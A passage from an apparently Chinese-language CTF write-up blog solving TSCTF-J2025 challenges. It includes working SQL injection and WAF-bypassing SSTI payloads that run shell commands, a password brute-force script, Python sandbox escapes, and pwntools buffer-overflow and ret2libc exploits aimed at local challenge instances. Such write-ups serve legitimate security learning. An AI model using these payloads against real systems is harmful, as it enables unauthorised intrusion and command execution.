href=\"%E9%9D%9E%E6%A0%A1%E5%86%85%E6%96%B0%E7%94%9F_Week1_%E5%9C%86%E5%91%A8%E7%8E%87_wp.pdf\">Week1.pdf</a></p>\n<p><a href=\"%E9%9D%9E%E6%A0%A1%E5%86%85%E6%96%B0%E7%94%9F_Week1_%E5%9C%86%E5%91%A8%E7%8E%87_wp.pdf\">Week2.pdf</a></p>\n<p><a href=\"%E9%9D%9E%E6%A0%A1%E5%86%85%E6%96%B0%E7%94%9F_Week1_%E5%9C%86%E5%91%A8%E7%8E%87_wp.pdf\">Week3.pdf</a></p>\n<p><a href=\"%E9%9D%9E%E6%A0%A1%E5%86%85%E6%96%B0%E7%94%9F_Week1_%E5%9C%86%E5%91%A8%E7%8E%87_wp.pdf\">Week4.pdf</a></p>\n","excerpt":"","more":"<p>0xGame2025顺利结束！最后拿了个总榜第4，去掉两个没交WP的，最后是第2~</p>\n<p>下面给出PDF版的WP，如果有机会的话，再整理到博客上</p>\n<p><a href=\"%E9%9D%9E%E6%A0%A1%E5%86%85%E6%96%B0%E7%94%9F_Week1_%E5%9C%86%E5%91%A8%E7%8E%87_wp.pdf\">Week1.pdf</a></p>\n<p><a href=\"%E9%9D%9E%E6%A0%A1%E5%86%85%E6%96%B0%E7%94%9F_Week1_%E5%9C%86%E5%91%A8%E7%8E%87_wp.pdf\">Week2.pdf</a></p>\n<p><a href=\"%E9%9D%9E%E6%A0%A1%E5%86%85%E6%96%B0%E7%94%9F_Week1_%E5%9C%86%E5%91%A8%E7%8E%87_wp.pdf\">Week3.pdf</a></p>\n<p><a href=\"%E9%9D%9E%E6%A0%A1%E5%86%85%E6%96%B0%E7%94%9F_Week1_%E5%9C%86%E5%91%A8%E7%8E%87_wp.pdf\">Week4.pdf</a></p>\n"},{"title":"TSCTF-J2025 WP","date":"2025-10-30T14:52:26.000Z","_content":"\n由于是用Word写的啦，还要转成markdown才能传上来，下面给出PDF版本的WP链接\n\n[TSCTF-J2025 WP](圆周率WP.pdf)\n\n下面的内容与上面一致，但由于转换时的疏忽，可能会：多反斜杠/少反斜杠/多出莫名其妙的星号/多出莫名其妙的换行，请谅解！\n\n最近会抽空对TSCTF-J2025进行复盘，敬请期待~\n\n> 不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用\n> \n> 如果图炸了的话请手动拼接URL，为\n>\n> <span id=\"urlNow\"></span>image-编号.png\n\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n\n## Abstract\n\n### \\[ab\\] The Great\n\n![alt text](image.png)\n<div>\n<img src=\"image-1.png\" style=\"float:right; zoom:0.7\">\n\n这题一开始也是没有思路的，后来放了很多提示，决定好好想一想。\n\n首先看到提示2，要我们写出音名：\n</div>\n\n![alt text](image-2.png)\n\n然后add（+）是一个很重要的提示，如果把ABCD......映射为1234......，那么音符就可以相加了，以第二个音为例：\n\n$$F_{6} + C_{3} = I_{9}$$\n\n由此，我们可以得出两个单词：EINSTEIN EQUATION，再结合提示1，应当以Latex形式写出爱因斯坦方程，故flag为\n\n<style>\n  box {\n    border: 1px solid;\n    padding: 2px;\n    font-weight: bold;\n  }\n</style>\n\n<box>TSCTF-J{E=mc\\^2}</box>\n\n## Misc\n\n### \\[misc\\] Meow\n\n这题一开始没思路，后面做了几题才回来的，因为一眼丁真看到了\"vfnd\"（\"TSC\"的base64是\"VFND\"）\n\n![alt text](image-3.png)\n\n虽然全是Meow，但是根据程序格式，可以猜出：\n\n![alt text](image-4.png)\n\n所以最后输出的是：\n\n![alt text](image-5.png)\n\n结合vfnd，猜测这是大小写反转的base64，进行解码\n\n![alt text](image-6.png)\n\n```\nIn [1]: import base64\n\nIn [2]: t = 'vfndveyTsNSkmv9bBq==xZrFq2fux01LB3Dnztb3iseHFq=='\n\nIn [3]: import string\n\nIn [4]: t = t.translate(str.maketrans(string.ascii_uppercase+string.ascii_lowercase, string.ascii_lowercase+string.ascii_uppercase))\n\nIn [5]: base64.b64decode(t)\n\nOut[5]: b'TSCTF-J{\\n1_Am'\n\nIn [6]: base64.b64decode(t.split('==', 1)[1])\n\nOut[6]: b'_4_CaT_MeowMe0w!!!}'\n```\n\n最后把换行符去掉，就得到了flag\n\n<box>TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}</box>\n\n### \\[misc\\] 卢森堡的秘密\n\n拿到zip和png，先进行binwalk和pngcheck，没有发现异常，考虑LSB，找到一个在线网站：<https://georgeom.net/StegOnline/upload>\n\n![alt text](image-7.png)\n\n找到flag\n\n<box>TSCTF-J{Th3_sEcre7_0f_L$B!}</box>\n\n### \\[misc\\] BadFile\n\n先强烈推荐一个Windows开源软件<https://github.com/QL-Win/QuickLook>，把苹果的QuickLook功能在Windows上复刻了，特别方便！按空格后还可以按上下键翻动\n\n先看txt\n\n经过翻找，发现好像几段泄露文本都有数字？那就启动grep\n\n```sh\ngrep -r -P '\\d'\n```\n\n![alt text](image-8.png)\n\n完美！\n\n下面看wav\n\n经过翻找，发现几段泄露音频都比较长，于是通过时长降序排列，发现前四都是\n\n![alt text](image-9.png)\n\n那......还有一段呢？只好慢慢翻了\n\n翻了好久终于找到了！居然只有1秒？？\n\n![alt text](image-10.png)\n\n\"我的家在北京市朝阳区\"......懂了，马上去线下真实你🤬\n\n最后是pdf\n\n经过翻找，发现恶意文件会弹窗，由于没有想到好的方法，一一查找\n\n![alt text](image-11.png)\n\n最后合成flag\n\n```\nIn [1]: pdf = list(sorted('''8YmxZRca.pdf\n...: mFU1SdVp.pdf\n...: w9V1ZDEd.pdf\n...: xdBqKtxe.pdf\n...: Z8P4DHre.pdf'''.split('\\n')))\n\nIn [2]: txt = list(sorted('''3WQlwSaj.txt\n...: dubZ3AZn.txt\n...: nhlbNxGL.txt\n...: qtFyaGkZ.txt\n...: wlBUCOeg.txt'''.split('\\n')))\n\nIn [3]: wav = list(sorted('''2JuiKL42.wav\n...: 4UjLqeRF.wav\n...: Ew24ldS2.wav\n...: HjRtD6f3.wav\n...: RtUwEgj1.wav'''.split('\\n')))\n\nIn [4]: '_'.join(['_'.join(l) for l in [txt, wav, pdf]])\n\nOut[4]:\n'3WQlwSaj.txt_dubZ3AZn.txt_nhlbNxGL.txt_qtFyaGkZ.txt_wlBUCOeg.txt_2JuiKL42.wav_4UjLqeRF.wav_Ew24ldS2.wav_HjRtD6f3.wav_RtUwEgj1.wav_8YmxZRca.pdf_Z8P4DHre.pdf_mFU1SdVp.pdf_w9V1ZDEd.pdf_xdBqKtxe.pdf'\n\nIn [5]: import hashlib\n\nIn [6]: hashlib.md5(_.encode()).hexdigest()\n\nOut[6]: '0b4a2a6431f6b94b3c1d3d50d0a45aea'\n```\n\n<box>TSCTF-J{0b4a2a6431f6b94b3c1d3d50d0a45aea}</box>\n\n<h3 id=\"misc-PyJail\" style=\"opacity:0.6;\">[misc] PyJail （半成品）</h3>\n\n拿到代码，发现globals受限，AST不允许访问\"\\_\\_\"开头的属性。\n\n一开始打算用反射获得完整环境：（这里157是os.\\_wrap_close的index，以实际情况为准）\n\n```python\n''.__class__.__mro__[1].__subclasses__()[157].__init__.__globals__\n```\n\n那么就需要绕过\"\\_\\_\"，使用Unicode绕过\n\n```python\n''._＿class__._＿mro__[1]._＿subclasses__()[157]._＿init__._＿globals__\n```\n![alt text](image-12.png)\n\n但是此举触发了import钩子，失败，接下来考虑栈帧逃逸\n\n```python\nprint(g:=[*(q:=(q.gi_frame.f_back.f_back.f_globals for _ in [1]))][0])\n```\n\n成功获得globals，但是接下来就没有思路了：\n\n- os.system/popen、subprocess都被ban了\n\n- \\_posixsubprocess不在sys.modules里，也无法被\\_\\_loader\\_\\_加载\n\n- 写WP的时候突然想到会不会在环境变量里，确认了一下，也没有\n\n![alt text](image-13.png)\n\n<box style=\"opacity: 0.6;\">PLACEHOLDER{TA5K_F4ILED}</box>\n\n## AI\n\n### \\[ai\\] Coup\n\n拿到题目还不知道是干什么的，看AI玩了一局才明白：我们要给代表我们的AI玩家写prompt，来指导它赢得比赛，下面给出我的提示词：\n\n```\nYou are a good Coup Game Player, your aim is to earn a lot money then to\ncoup the other player to death while keep you alive\n```\n\n经过测试，一遍拿到flag，但是仍有改进的余地，AI明显把赚钱放在了第一位，只有到10+才会被迫coup别人，可以强调一下两个任务的优先级。\n\nflag是什么来着？不记得了！😰\n\n<box style=\"opacity:0.6;\">PLACEHOLDER{I_forg0t_mY_fl@g}</box>\n\n<h3 id=\"ai-JustReverse\" style=\"opacity: 0.6;\">[ai] JustReverse （失败）</h3>\n\n根据给出的模型和参数，进行反向求解，但是哪里似乎写错了/不够精确，没有求出flag，代码附在最后。\n\n![alt text](image-14.png)\n\n（你总不能跟我讲这个就是flag吧）\n\n<box style=\"opacity: 0.6;\">PLACEHOLDER{T4SK_FA1L3D}</box>\n\n## Web\n\n### \\[web\\] EZ_Login（签到）\n\n一个登录界面，先尝试SQL注入，发现貌似没有注入点。\n\n下面采取爆破，因为有验证码，但好像只要有某一次的session就提交对应的验证码就好了，下面的脚本还是模拟了登录全流程，并且加了连接中断的处理\n\n```python\nimport requests\nimport re\n\ndef crack(pwd):\n\n    s = requests.Session()\n\n    cookies = {\n        # 省略\n    }\n\n    headers = {\n        # 省略\n    }\n\n    response = s.get('http://127.0.0.1:54655/login', cookies=cookies, headers=headers)\n\n    data = {\n        'username': 'admin',\n        'password': pwd,\n        'captcha': ''.join(re.findall(r'(?<=captcha_images/)\\d(?=\\.png)', response.text))\n    }\n\n    response = s.post(\n        'http://127.0.0.1:54655/login',\n        cookies=cookies,\n        headers=headers,\n        data=data,\n    )\n\n    print(re.findall(f'>.*?错误.*?<', response.text))\n    return '错误' not in response.text\n\nfor i, pwd in enumerate(open('D:/PiYuanZhouLv/rockyou.txt')):\n    pwd = pwd.strip()\n    if not pwd.startswith('s'):\n        continue\n    print(i, pwd)\n    while True:\n        try:\n            if crack(pwd):\n                print(\"THE PASSWORD IS\", pwd)\n                exit()\n        except:\n            import time\n            print('Have a rest!')\n            time.sleep(10)\n        else:\n            break\n```\n\n部分代码由<https://curlconverter.com/>生成\n\n运行，得到密码\"simple\"，尝试登录，提示\"非本地管理员\"\n\n![alt text](image-15.png)\n\n由于wsrx，我们的请求的Referer/Origin都是本地地址（就算wsrx会改那我们也无法控制），所以应该是X-Forwarded-For请求头，复制到HTTPie（或者你的请求软件），将X-Forwarded-For改为127.0.0.1\n\n![alt text](image-16.png)\n\n显示登陆成功，但是......我flag呢？！\n\n在这里卡了，直到后面伪造session的时候才知道这个token是有数据的，上<https://www.jwt.io/>看看\n\n![alt text](image-17.png)\n\n看到flag了！\n\n<box>TSCTF-J{w31c0m3_70_7h3_w38_j0urn3y}</box>\n\n### \\[web\\] EZ_SQL\n\n上来先用通用密码 `' or 1=1 #`\n\n看到一大堆垃圾数据，和一个fleg（\n\n![alt text](image-18.png)\n\n好了，下面就是union注入的时候了\n\n![alt text](image-19.png)\n\n列数为三的时候没有报错，说明回显列为3\n\n查表名：\n\n```sql\n' union select 1, 2, (select group_concat(table_name) FROM\ninformation_schema.tables WHERE table_schema = database()) #\n```\n\n![alt text](image-20.png)\n\n发现flag这个表很有可能是我们的目标，查列名：\n\n```sql\n' union select 1, 2, (select group_concat(column_name) FROM\ninformation_schema.columns WHERE table_name='flag') #\n```\n\n![alt text](image-21.png)\n\n最后查flag\n\n```sql\n' union select 1, 2, (select flag from flag) #\n```\n\n![alt text](image-22.png)\n\n诶诶，怎么炸了！经过搜索，发现是编码不一致导致的，所以\n\n```sql\n' union select 1, 2, (select convert(flag using utf8) from flag) #\n```\n\n![alt text](image-23.png)\n\n<box>TSCTF-J{sql_1nj3ct10n_m4573r}</box>\n\n### \\[web\\] EZ_PY\n\n上来先试注入什么的，无果，突然发现网页中的一行注释\n\n![alt text](image-24.png)\n\n访问/source，获得源码\n\n![alt text](image-25.png)\n\n一个SSTI注入点，但是要admin的session，而且有waf\n\n![alt text](image-26.png)\n\n一段熟悉的套路代码（上周0xGame考了），可以原型链污染\n\n![alt text](image-27.png)\n\n所以，我们通过/register进行原型链污染，把app.config\\[\\'SECRET_KEY\\'\\]改成一个已知值，然后伪造session，进行SSTI注入，获得flag\n\n下面开始：\n\n1.  原型链污染\n  ![alt text](image-28.png)\n2.  session伪造+SSTI\n\nsession伪造可以直接去前面提到的jwt.io上构造，现在就是SSTI和绕WAF了。\n\n![alt text](image-29.png)\n\n首先，注入符号被ban了，但是有hello hacker最后被替换\n\n然后把SSTI注入的关键词都ban的差不都了，但！是！下面那些过滤JavaScript的代码就有用了！比如\\_\\_class\\_\\_就可以写成\\_\\_cl<span style=\"opacity:0.6;\">javascript:</span>ass\\_\\_，不过为了过滤flask.g，它把所有带g的都！ban！掉！了！所以通过subclasses找到os.\\_wrap_close再.\\_\\_init\\_\\_.\\_\\_<span style=\"color: red;\">g</span>lobals\\_\\_的路就GG了。虽然没办法直接拿到os，但是我们可以拿到\\_\\_import\\_\\_，然后.popen().read()就ok啦\\~\n\n```\nhello ''.__clajavascript:ss__.__mrjavascript:o__[1].__subcljavascript:asses__()[141].__injavascript:it__.__builjavascript:tins__['__impjavascript:ort__']('ojavascript:s').popjavascript:en('cat /flag').rejavascript:ad() hacker\n```\n\n![alt text](image-30.png)\n\n不对不对，fla<span style=\"color: red;\">g</span>还有一个g，改成fla?使用通配符就好了\n\n![alt text](image-31.png)\n\nok，拿到flag\\~\n\n<box>TSCTF-J{y0u_c0mp1373d_7h3_py_pr0813m}</box>\n\n## Crypto\n\n### \\[crypto\\] Cantor\\'s gifts\n\n题目给出的hint是打乱后的某数后有多少个数比它小与阶乘相乘之和，所以先提取出复合前的这个数，再恢复乱序数列，最后恢复flag。\n\n一开始是通过模从小阶乘开始算的，不知道为什么不对，最后是从大阶乘整除恢复的，上代码：\n\n```python\nhint = 2498752981111460725490082182453813672840574\nhint2 = b'5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t'\n\nn = len(hint2)\n\nimport functools\n@functools.cache\ndef f(n):\n    if n <= 1:\n        return 1\n    return n * f(n-1)\n\nrenum = []\nfor i in range(n-1):\n    h = hint - sum([rn*f(n-1-j) for j, rn in enumerate(renum)])\n    rn = h // f(n-i-1)\n    renum.append(rn)\nrenum = renum[::-1]\n\nprint(renum)\n\nrebuilt = [1, 0] if renum.pop(0) else [0, 1]\nfor rn in renum:\n    nums = list(sorted(rebuilt))\n    if rn == 0:\n        rebuilt = [nums[0]-1] + rebuilt\n    elif rn == len(nums):\n        rebuilt = [nums[-1]+1] + rebuilt\n    else:\n        rebuilt = [(nums[rn-1]+nums[rn])/2] + rebuilt\nmp = {num: std for std, num in enumerate(sorted(rebuilt))}\nrebuilt = [mp[num] for num in rebuilt]\n\nprint(rebuilt)\n\nmsg = bytearray(hint2)\nfor i, c in zip(rebuilt, hint2):\n    msg[i] = c\n\nprint(msg)\n```\n\n得到flag\n\n<box>TSCTF-J{c4nt0r5_g1ft_f0r_th3_f1r5t_y0u_t0_m3t}</box>\n\n### \\[crypto\\] Sign in\n\n很简单，考察异或的性质：$P\\bigoplus Q\\bigoplus P = (P\\bigoplus P)\\bigoplus Q = Q$\n\n给出代码：\n\n```python\nimport base64, functools\n\nbase64.b64decode(bytes.fromhex(hex(functools.reduce(lambda x, y: x^y,\nmap(lambda z: int(z, 16),\n['a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93',\n'11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f',\n'e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121'])))[2:]))\n```\n\n<box>TSCTF-J{I_like_Crypto}</box>\n\n### \\[crypto\\] p=\\~q\n\n与TSCTF-J2024 ezRSA的part3类似，p、q的特殊关系可以改写为p\\^q的值，然后就可以剪枝。之前ezRSA的时候自己写的程序就炸了，所以核心部分是从网上不记得哪个地方抄的了\n\n```python\nn = 17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543\nc = 6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460\n\ndef get_pq(n, x):\n    a = [0]\n    b = [0]\n    maskx = 1\n    maskn = 2\n    for i in range(1024):\n        xbit = (x & maskx) >> i\n        nbit = n % maskn\n        t_a = []\n        t_b = []\n        for j in range(len(a)):\n            for aa in range(2):\n                for bb in range(2):\n                    if aa ^ bb == xbit:\n                        tmp2 = n % maskn\n                        tmp1 = (aa * maskn // 2 + a[j]) * (bb * maskn // 2 + b[j]) % maskn\n                        if tmp1 == tmp2:\n                            t_a.append(aa * maskn // 2 + a[j])\n                            t_b.append(bb * maskn // 2 + b[j])\n        maskx *= 2\n        maskn *= 2\n        a = t_a\n        b = t_b\n    for a1, b1 in zip(a, b):\n        if a1 * b1 == n:\n            return a1, b1\n\np, q = get_pq(n, int('1'*1022+'0', 2))\nphi = (p-1)*(q-1)\nd = pow(0x10001, -1, phi)\n\nfrom Crypto.Util.number import long_to_bytes\n\nprint(long_to_bytes(pow(c, d, n)))\n```\n\n<box>TSCTF-J{The_easiest_RSA_key!}</box>\n\n### \\[crypto\\] 野狐禅\n\n考察了Paillier加密体系，此处取$g = n + 1$\n\n先看加密逻辑：\n\n$$\nc = {(g}^{m} \\times r^{n})\\ mod\\ n^{2} \\\\\\\\\n= \\left( (n + 1)^{m} \\times r^{n} \\right)\\ mod\\ n^{2} \\\\\\\\\n= \\left( (mn + 1) \\times r^{n} \\right)\\ mod\\ n^{2}\n$$\n\n由于n、r都知道，所以\n\n$$m = \\frac{\\frac{c}{r^{n}} - 1}{n}\\ mod\\ n^{2}$$\n\n可以直接解密（一开始走歪了，想到同态去了），由于懒了一下，是AI生成的：\n\n```python\nfrom Crypto.Util.number import long_to_bytes\nfrom sympy import Matrix\n\ndef main():\n    with open(\"challenge.txt\", \"r\") as f:\n        lines = f.readlines()\n\n    n = int(lines[0].split(\": \")[1])\n    g = int(lines[1].split(\": \")[1])\n    k = int(lines[2].split(\": \")[1])\n    eqs = int(lines[3].split(\": \")[1])\n\n    ciphertexts = []\n    for i in range(4, 4 + 2 * k):\n        ciphertexts.append(int(lines[i].strip()))\n    \n    raws = []\n    for i in range(4 + 2 * k, 4 + 4 * k):\n        raws.append(int(lines[i].strip()))\n    \n    n2 = n * n\n    y_list = []\n    for i in range(2 * k):\n        c = ciphertexts[i]\n        raw_val = raws[i]\n        r = raw_val % n\n        r_n = pow(r, n, n2)\n        inv_r_n = pow(r_n, -1, n2)\n        temp = (c * inv_r_n) % n2\n        m_val = (temp - 1) // n\n        y_list.append(m_val)\n    \n    A = []\n    b = []\n    for i in range(k):\n        b.append(y_list[k + i])\n        row = []\n        for j in range(k):\n            row.append(y_list[k + i - 1 - j])\n        A.append(row)\n    \n    A_mat = Matrix(A)\n    b_mat = Matrix(b)\n    try:\n        x = A_mat.solve(b_mat)\n    except ValueError:\n        print(\"Matrix is not invertible\")\n        return\n    \n    coeffs = []\n    for i in range(k):\n        val = x[i]\n        if val.is_Integer:\n            coeffs.append(int(val))\n        else:\n            coeffs.append(round(float(val)))\n    \n    for c in coeffs:\n        if c not in [0, 1, 2]:\n            print(f\"Warning: coefficient {c} is not in [0,1,2]\")\n    \n    num = 0\n    for i in range(k):\n        num += coeffs[i] * (3 ** i)\n    \n    flag = long_to_bytes(num)\n    print(flag.decode())\n\nif __name__ == \"__main__\":\n    main()\n```\n\n<box>TSCTF-J{We_sh0u1d_kn0w!}</box>\n\n## Pwn\n\n### \\[pwn\\] ret\n\n先静态分析，发现一个无限溢出和一个后门函数，直接上exp\n\n<div><img src=\"image-32.png\" style=\"float: left;\"><img src=\"image-33.png\" style=\"float: left;\"></div>\n\n```python\nfrom pwn import *\n\nio = connect('127.0.0.1', 41541)\n\nbkd = 0x400676\nret = 0x400501\n\nio.sendafter(b'n!', cyclic(0x10+8)+p64(ret)+p64(bkd))\n\nio.interactive()\n```\n\n![alt text](image-34.png)\n\n<box>TSCTF-J{weLC0ME_to-TH3-WORld_Of-6INaRY-vuLNER@BIlItY0}</box>\n\n<h3 id=\"pwn-pop\" style=\"opacity:0.6;\">[pwn] pop （半成品）</h3>\n\n静态分析，依然是一个无限溢出，但是连system都没有，考虑ret2libc\n\n![alt text](image-35.png)\n\n1.  漏地址\n\n  发现vuln函数有一部分可以利用，可以先用gadget把puts的got传给rdi，接下来跳0x400633，然后获得puts地址和下一次溢出机会\n  ![alt text](image-36.png)\n\n2.  执行system(\\\"/bin/sh\\\")\n\n接下来有了libc，就可以算出system的地址，也可以找到/bin/sh的字符串，然后就可以getshell啦\\~\n\n但是，问题来了，由于vuln的返回方式是leave\nret，两次操作下来相当于栈迁移了，栈跑到奇怪的地方了，试着把栈改到bss，但是没成功（不排除是我太菜了😅），下面给出代码（未成功）\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64', os='linux', log_level='debug')\n\nputs_got = 0x601018\nleak_addr = 0x400633\nedi_ret = 0x400713\nret_only = 0x4004c9\nrbp = 0x601090\n\nio = gdb.debug('./pwn')\nlibc = ELF('libc-2.23.so')\n\nio.sendafter(b'time!\\n',\ncyclic(0x10)+p64(rbp)+p64(edi_ret)+p64(puts_got)+p64(leak_addr)+b'\\n')\n\nputs_real = u64(io.recv(8)[:-1].ljust(8, b'0'))\nlog.debug(f'puts addr: {hex(puts_real)}')\n\nlibc_to_real = lambda x: x - libc.sym['puts'] + puts_real\nlog.debug(f'Libc base: {hex(libc_to_real(0))}')\n\nsystem_real = libc_to_real(libc.sym['system'])\nbin_sh_real = libc_to_real(next(libc.search(b'/bin/sh')))\n\nio.send(cyclic(0x10)+p64(rbp)+p64(edi_ret)+p64(bin_sh_real)+p64(ret_only)+p64(system_real)+b'\\n')\n\nio.interactive()\n```\n\n<box style=\"opacity: 0.6;\">PLACEHOLDER{I_d0nt_kNovv}</box>\n\n~~对了，因为卡这题了，所以后面的pwn都没有看了~~\n\n## Reverse\n\n### \\[re\\] Singin\n\n先静态分析（下面一些函数是我自己命名的）\n\n首先，看到核心逻辑，Buf2是目标，Buf1是加密输出，进do_something看看\n\n![alt text](image-37.png)\n\n![alt text](image-38.png)\n\n这里是一个异或加密，进b64e\n\n![alt text](image-39.png)\n\n一个\"标准\"的base64，但是有一个奇怪的函数，进change_charset\n\n![alt text](image-40.png)\n\n啊哈！这里把标准的字符集改掉了！所以这是一个自定义的base64，下面提取相关数据，因为我比较懒，就运行提取一下啦\\~\n\n![alt text](image-41.png)\n\n↑Buf2的值\n\n变换后的key\n↓\n\n![alt text](image-42.png)\n\n上代码：\n\n```python\nbuf2 = [0x23,0x7C,0x34,0x61,0x32,0x2,0x13,0x3D,0x67,0x12,0x64,0xD,0x37,0x2,0x34,0x14,0x3,0x7A,0x2B,0x69,0x24,0x70,0x34,0x61,0x32,0x70,0x6B,0x76,0x2,0x42,0x28]\n\nkey = 'w/w5t/YF0wUnwoQKwJt='\n\nprint(''.join([chr(c^ord(key[i%len(key)])) for i, c in enumerate(buf2)]))\n```\n\n![alt text](image-43.png)\n\n<box>TSCTF-J{We1c@me_t0_TS_CTF_2025}</box>\n\n### \\[re\\] 听绿的秘密\n\n看了题目描述，还以为是苹果逆向，吓死了\n\n这道题考的是Java的自定义加载class\n\n先用Jadx打开，发现自定义加载了一个类，而主逻辑很可能就在这个类里面，所以第一步是恢复Secret类\n\n![alt text](image-44.png)\n\n看到上面的CustomClassLoader的定义\n\n![alt text](image-45.png)\n\n解密操作是给原文件里面的字节减7，先提取Secret.obf，下面用python完成解密\n\n```python\nopen('Secret.class', 'wb').write(bytes((v - 7)%256 for v in open('Secret.obf', 'rb').read()))\n```\n\n接下来就用jadx打开还原的Secret.class，就能看到图片加密的逻辑了，然后就是解密图片\n\n![alt text](image-46.png)\n\n下面给出解密脚本：\n\n```python\ncontent = open('Where_is_my_cat.png', 'rb').read()\ncat = bytearray(content)\ni2 = 123\nfor i3 in range(len(content)):\n    i7 = content[i3]\n    i = i7\n    i5 = (i3+i2)%8\n    if i5:\n        i6 = ((i>>i5)|(i<<(8-i5))) & 255\n    else:\n        i6 = i\n    i4 = (i6 - i2 - i3 % 251) % 256\n    i2 = (i2 + i7 + 37) & 255\n    cat[i3] = i4\n\nopen('Cat.png', 'wb').write(cat)\n```\n\n![alt text](image-47.png)\n\n获得flag\n\n<box>TSCTF-J{181_c3ntimeTer5?}</box>\n\n### \\[re\\] CryDancing\n\n苹果逆向终究还是来了吗......\n\n上次在哪里的ipa逆向连可执行文件都没找到😅，这次总算找到了，先静态分析\n\n![alt text](image-48.png)\n\n从strings里面找到可能相关的字符串，进到了核心逻辑，大概就是把输入（obj）进行加密（YouCanSeeThisRight），然后与目标字符串对比，下面进到加密函数\n\n![alt text](image-49.png)\n\n这里先执行GetKey函数，然后把它重复四遍作为下面CCCrypt的密钥，经过搜索，这个应该是AES，用的是CBC模式，iv是375（小端），然后进到GetKey函数\n\n![alt text](image-50.png)\n\n反编出来的代码奇奇怪怪的，不过关键的是：这个函数返回四个大写字母，并且返回值的MD5是已知的，所以直接爆破\n\n```sh\nhashcat -a 3 -m 0 674040176a34f6c994003fe85badfc48 ?u?u?u?u\n```\n\n![alt text](image-51.png)\n\n得到返回值：NOTD，也就是说，key就是NOTDNOTDNOTDNOTD\n\n下面用python恢复flag\n\n![alt text](image-52.png)\n\n```python\nimport base64\n\nfrom Crypto.Cipher import AES\n\ncipher = AES.new(b'NOTDNOTDNOTDNOTD', AES.MODE_CBC, iv=(375).to_bytes(16, 'little'))\n\nprint(cipher.decrypt(base64.b64decode('bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==')))\n```\n\n得到flag\n\n<box>TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}</box>\n\n### \\[re\\] 哭泣之子\n\n这是什么新型的阴乐播放器吗（突然想起来传说中的O泡果奶病毒）\n\n拿到附件，发现这是一个.Net程序，用dnSpy打开，没有发现加密逻辑，然后就进行调试\n\n![alt text](image-53.png)\n\n在输出里发现了一行报错：找不到文件flag，那就肯定是核心逻辑了，在对应异常上下断点（调试-\\>窗口-\\>异常设置）\n\n![alt text](image-54.png)\n\n之后成功停下，再沿着调用堆栈往回翻，发现加密逻辑\n\n![alt text](image-55.png)\n\n接下来就是解密啦\\~\n\n因为这个不好直接解密（实际上也无法直接解密），所以使用z3求解，下面给出代码：\n\n```python\nimport z3\narray3 = [871, 1654, 789, 1617, 1221, 2173, 871, 1724, 629, 1111, 789,\n1664, 783, 1579, 989, 1633, 1229, 2148, 891, 1703, 1237, 2249, 1229,\n2161, 1157, 2095, 1237, 2201, 1243, 2166, 789, 1604, 941, 1669, 813,\n1651, 845, 1633, 807, 1645, 941, 1673, 971, 1863, 941, 1648, 789, 1620,\n941, 1659, 1255, 2157, 1167, 2121, 941, 1647, 807, 1662, 845, 1634,\n1243, 2165, 813, 1650, 941, 1676, 813, 1697, 783, 1589, 941, 1654, 1167,\n2097, 1255, 2157, 941, 1673, 789, 1597, 941, 1655, 941, 1653, 813, 1673,\n789, 1598, 891, 1735, 941, 1600, 629, 1076, 891, 1728, 603, 1008, 389,\n827]\na3o = array3[:]\nfor k in range(0, 99, 2):\n    solver = z3.Solver()\n    a2k, a2kp1 = z3.BitVecs('a2k a2kp1', 32)\n    solver.add(a2k<=125)\n    solver.add(a2kp1<=125)\n    solver.add(a2k>=32)\n    solver.add(a2kp1>=32)\n    num = a2k << 3 ^ 83\n    a2kn = (num + a2k ^ a2k + 72)\n    a2kp1n = a2kn + (num ^ a2kp1)\n    solver.add(a2kn == array3[k])\n    solver.add(a2kp1n == array3[k+1])\n    assert solver.check() == z3.sat\n    array3[k] = solver.model()[a2k].as_long()\n    array3[k+1] = solver.model()[a2kp1].as_long()\n\nprint(bytes(array3))\n```\n\n当然，在没有提示之前，我写的范围是\\[0, 256\\)，解出来的flag长这样：\n\n![alt text](image-56.png)\n\n里正确答案只剩下两个字符（即一个方程组）了，当时太晚了，没有再想想就睡觉了，早上看到提示后就解出来了\n\n正确flag：\n\n<box>flag{3f619a0b_Would_you_say_that_someone_who_had_every_intention_to_be_brave_was_a_coward?_81dd64f3}</box>\n\n注：判断完正误是有回显的，程序会修改NAudio.Midi.dll的前几字节\n\n![alt text](image-57.png)\n\n<div>\n<img src=\"image-58.png\" style=\"float: right\">\n\n又注：一开始把注意力放到提取阴乐的地方去了，发现还有一张png图片内嵌了（其实就是应用的图标），在这里放出来，吓💩你们~~（bushi~~\n</div>\n\n### \\[re\\] Catbits\n\n编程猫逆向？什么玩意儿（丢）\n\n其实这道题没那么难，只是逻辑不太好找而已，真正逆向很简单\n\n考虑到大家可能都没有学过编程猫（其实我也没学过），从配置环境开始\n\n1.  安装Scratch\n\n一般情况我都是在官网下安装包的，奈何官网被ban了，那就从Microsoft Store凑合一下吧\n\n![alt text](image-59.png)\n\n2.  